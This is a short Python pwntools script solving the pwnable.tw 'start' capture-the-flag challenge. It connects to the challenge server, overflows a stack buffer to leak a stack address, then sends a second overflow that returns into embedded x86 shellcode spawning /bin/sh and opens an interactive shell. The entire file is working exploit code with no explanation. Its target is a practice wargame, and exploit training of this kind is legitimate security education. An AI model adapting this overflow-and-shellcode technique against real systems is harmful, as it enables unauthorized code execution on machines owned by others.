#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# io = process('./start')
# raw_input('debug ->')
# gdb.attach(io)
io = remote('chall.pwnable.tw', 10000)
elf = ELF('./start')

payload = 'a' * 20 + p32(0x8048073)
io.recvuntil('CTF:')
io.send(payload)
io.recv(16)
stack = u32(io.recv(4))
success('stack address ->{:#x}'.format(stack))
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73" 
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0" 
shellcode += "\x0b\xcd\x80"
io.send('a' * 20 + p32(stack+4) + shellcode)
io.interactive()
io.close()
